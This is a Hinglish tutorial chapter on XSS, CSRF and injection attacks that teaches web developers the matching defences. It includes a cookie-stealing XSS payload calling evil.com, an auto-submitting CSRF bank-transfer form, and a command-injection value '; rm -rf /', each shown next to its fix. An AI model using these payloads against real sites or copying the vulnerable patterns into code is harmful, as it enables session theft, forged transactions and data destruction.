# XSS, CSRF, and Injection Attacks

**Module:** 23-Security
**Difficulty:** 🔴 Advanced
**Previous:** [22-Performance/04-Caching-and-Network-Optimization.md](../22-Performance/04-Caching-and-Network-Optimization.md)
**Next:** [02-Prototype-Pollution-and-CORS-Mistakes.md](./02-Prototype-Pollution-and-CORS-Mistakes.md)

---

## 1. Learning Objectives

- XSS (Cross-Site Scripting) ka mechanism aur prevention samajhna (Module 11, chapter 03 se aage badhate hue).
- CSRF (Cross-Site Request Forgery) ka concept samajhna.
- Injection attacks ki broader category samajhna (SQL Injection, Module 20 chapter 04 se connected).

## 2. Prerequisites

Module 11, chapter 03 (`innerHTML` risk), Module 20, chapter 04 (SQL Injection).

## 3. Concept in Simple Hinglish

**XSS** tab hoti hai jab attacker malicious JavaScript ko tumhari website mein "inject" kar deta hai, jo dusre users ke browsers mein chalta hai. **CSRF** tab hoti hai jab attacker ek logged-in user ko unknowingly ek unwanted action perform karwa deta hai (jaise money-transfer). **Injection attacks** (broadly) tab hoti hain jab untrusted input ko code/query ki tarah execute hone diya jaata hai.

## 4. Technical Explanation

**XSS (Cross-Site Scripting):** Attacker malicious script inject karta hai jo victim ke browser mein, victim ki identity/session ke saath execute hoti hai.
- **Stored XSS:** Malicious script database mein save hota hai (jaise comment field), phir har visitor ko serve hota hai.
- **Reflected XSS:** Malicious script URL/request ke through aata hai aur turant response mein reflect hota hai.

**CSRF (Cross-Site Request Forgery):** Attacker ek malicious link/form banata hai jo, agar logged-in user click kare, unki authenticated session use karke unwanted request bhej deta hai kisi trusted site pe.

## 5. Syntax

```js
// ⚠️ XSS-vulnerable
element.innerHTML = userInput; // If userInput contains <script>, it can execute!

// ✅ XSS-safe
element.textContent = userInput; // Always treated as plain text
```

## 6. Basic Examples

```js
// ⚠️ Vulnerable to Stored XSS
function displayComment(comment) {
  document.getElementById("comments").innerHTML += `<p>${comment}</p>`;
  // If comment = "<script>stealCookies()</script>", it EXECUTES for every visitor!
}
```

## 7. Detailed Examples

**XSS attack walkthrough (revisiting Module 11, chapter 03):**
```js
// Attacker submits this as a "comment":
const maliciousComment = `<img src="x" onerror="fetch('https://evil.com/steal?cookie=' + document.cookie)">`;

// ⚠️ If the site does this:
document.getElementById("comments").innerHTML += `<p>${maliciousComment}</p>`;
// The <img> tag's onerror fires (since "x" isn't a valid image), running the attacker's script,
// which sends the victim's cookies to the attacker's server!

// ✅ The fix — sanitize or use textContent
document.getElementById("comments").textContent += maliciousComment;
// Now it displays as literal text: <img src="x" onerror="..."> — harmless, not executed
```
**Key principle (revisiting Module 11, chapter 03):** **Kabhi bhi user-generated content ko `innerHTML` mein directly na daalo** bina proper sanitization ke. `textContent` use karo jab tak HTML rendering genuinely zaroori na ho, aur agar zaroori ho, ek trusted sanitization library (jaise DOMPurify) use karo.

**CSRF attack walkthrough — understanding the mechanism:**
```html
<!-- Attacker's malicious website contains this hidden form -->
<form action="https://yourbank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker-account">
</form>
<script>document.getElementById("csrf-form").submit();</script>

<!-- If the VICTIM is currently logged into yourbank.com in another tab,
     their browser AUTOMATICALLY includes their session cookie with this request!
     The bank's server might think this is a legitimate request from the logged-in user. -->
```
**✅ CSRF Prevention — anti-CSRF tokens:**
```js
// Server generates a unique, unpredictable token per session/form
// <input type="hidden" name="csrf_token" value="random-unpredictable-value">

// Server validates this token on submission — an attacker's forged form
// won't have the correct (secret) token, so the request is rejected.
```
Modern frameworks aur `SameSite` cookie attributes (jo browsers ko cross-site requests mein cookies bhejna restrict karte hain) is problem ko significantly mitigate karte hain.

**Injection attacks — the broader pattern (connecting to Module 20, chapter 04):**
```js
// SQL Injection (Module 20, chapter 04) — untrusted input treated as CODE
// const query = `SELECT * FROM users WHERE name = '${userInput}'`; // ⚠️ Vulnerable

// Command Injection — a similar concept, with OS commands
// const { exec } = require("child_process");
// exec(`ls ${userInput}`); // ⚠️ If userInput = "; rm -rf /", this could be catastrophic!

// ✅ General principle across ALL injection types:
// NEVER let untrusted input become part of the "code/command structure" —
// always treat it strictly as DATA (parameterized queries, proper escaping, allow-lists)
```

## 8. Mental Model

XSS ko socho **ek chitthi jisme koi ek "self-executing bomb" chhupa deta hai** — jo bhi wo chitthi khole (browser render kare), bomb (script) turant activate ho jaata hai. CSRF ko socho **kisi ke signature ka misuse karna unki knowledge ke bina** — attacker khud sign nahi karta, balki victim ko unknowingly "sign" karwa deta hai apni already-authenticated identity se.

## 9. What Happens Internally?

XSS browser ke HTML-parsing/JavaScript-execution engine ka fayda uthati hai — jo bhi valid HTML/JS browser ko "diya" jaata hai (`innerHTML` ke through), wo usse execute kar deta hai, chahe wo source genuinely trusted ho ya nahi. CSRF browser ke automatic-cookie-attachment behavior ka fayda uthati hai — browser cross-site requests mein bhi relevant cookies automatically attach kar deta hai (jab tak `SameSite` restrictions na hon).

## 10. Common Mistakes

- User-generated content ko `innerHTML` mein directly render karna bina sanitization ke.
- Forms/state-changing-actions ke liye CSRF-tokens implement na karna.
- Injection-prevention ko sirf SQL tak limited samajhna — command injection, NoSQL injection, aur XSS sab isi broader family ke attacks hain.

## 11. Edge Cases

Content Security Policy (CSP) headers ek additional defense-layer hain — browser ko batate hain "sirf specific sources se scripts allow karo", jo XSS ke impact ko significantly reduce kar sakta hai chahe koi vulnerability exist bhi kare.

## 12. Real-World Usage

XSS aur SQL Injection historically OWASP Top 10 (most critical web vulnerabilities) mein consistently top-ranked rahe hain. Har production web application ko in attacks se defend karna padta hai — frameworks (React, Angular) by default kuch protection dete hain (jaise React automatically escapes content unless `dangerouslySetInnerHTML` explicitly use kiya jaaye).

## 13. Comparison With Related Concepts

| Attack | Target | Prevention |
|--------|--------|----------------|
| XSS | Victim's browser (runs attacker's script) | `textContent`, sanitization, CSP |
| CSRF | Victim's authenticated session (forges a request) | Anti-CSRF tokens, `SameSite` cookies |
| SQL Injection | Backend database | Parameterized queries (Module 20) |

## 14. Practice Questions

1. Stored XSS aur Reflected XSS mein kya difference hai?
2. CSRF attack kaise possible hoti hai (browser ka kaunsa behavior exploit hota hai)?
3. Injection attacks ka common underlying principle kya hai?

## 15. Challenge

Ek chhota comment-display function likho jo pehle vulnerable ho (`innerHTML` use kare), phir usse secure karo (`textContent` use karke), aur ek example malicious input likho jo dikhaye difference clearly.

## 16. Interview Questions

**Q1: XSS (Cross-Site Scripting) kya hai aur ise kaise prevent karte hain?**
A: XSS ek attack hai jisme attacker malicious JavaScript ko ek website mein inject kar deta hai (jaise ek comment-field ke through), jo phir **dusre users ke browsers** mein execute hoti hai jab wo page load karte hain — attacker's script victim ki session/cookies ko access kar sakti hai, unki taraf se actions perform kar sakti hai. Prevention ka core principle hai: **user-generated/untrusted content ko kabhi bhi `innerHTML` ke through directly render na karo** — `textContent` use karo (jo hamesha plain text treat karta hai), ya agar HTML rendering zaroori ho, ek trusted sanitization library use karo jo dangerous tags/attributes ko strip kare.

**Q2: CSRF (Cross-Site Request Forgery) kaise kaam karta hai?**
A: CSRF tab hota hai jab ek attacker ek malicious webpage banata hai jisme ek hidden form ya request hoti hai kisi **trusted site** (jaise ek bank) ke liye. Agar victim currently us trusted site pe logged-in hai (session-cookie active hai) aur attacker ki malicious page visit karta hai, victim ka browser **automatically** us trusted site ki cookies attach kar deta hai forged request ke saath — server ko lagta hai request legitimately logged-in user se aayi hai. Prevention mein anti-CSRF tokens (server-generated, form-specific, unpredictable values jo attacker guess nahi kar sakta) aur `SameSite` cookie attributes shamil hain, jo cross-site requests mein cookies ke automatic-attachment ko restrict karte hain.

## 17. Chapter Summary

XSS malicious scripts ko victim-browsers mein inject karti hai — `textContent`/sanitization se prevent hoti hai. CSRF authenticated sessions ka misuse karke unwanted actions forge karti hai — anti-CSRF tokens/`SameSite` cookies se prevent hoti hai. Injection attacks (SQL, command, XSS sab) ka common principle hai untrusted-input ko code/command-structure ka part banne dena — hamesha data ki tarah treat karna chahiye.

## 18. Revision Checklist

- [ ] XSS ka mechanism aur `textContent`-based prevention clear hai.
- [ ] CSRF ka browser-cookie-behavior-exploitation mechanism samajh gaya.
- [ ] Injection attacks ka common underlying principle (data vs code) yaad hai.

---

**Next:** [02-Prototype-Pollution-and-CORS-Mistakes.md](./02-Prototype-Pollution-and-CORS-Mistakes.md)
